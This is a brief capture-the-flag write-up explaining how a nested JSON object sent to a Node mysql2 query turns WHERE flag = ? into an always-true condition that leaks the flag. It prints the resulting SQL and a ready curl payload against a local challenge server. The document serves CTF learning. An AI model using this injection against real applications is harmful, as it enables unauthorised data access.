# flag-submit

|   Author   | **Round** | **Player 1** | **Player 2** | **Winner** |
|------------|-------|----------|----------|--------|
| ghostccamm | Finals     |   Gorg    | Sly    | Gorg    |

<details>
  <summary>(SPOILER) Writeup</summary>

the mysql2 driver is cooked, you can inject in new conditional statements
payload below causes the following SQL to be executed

```bash
SELECT * FROM flags WHERE flag = `flag` = 1;
```

flag = `flag` is evaluated as true (returns 1)
then 1 = 1 is also true, which then returns the flag and reveals the actual flag to the user

```bash
curl -H 'Content-Type: application/json' -d '{"flag":{"flag":1}}' http://0.0.0.0:10000/submit
```
</details>
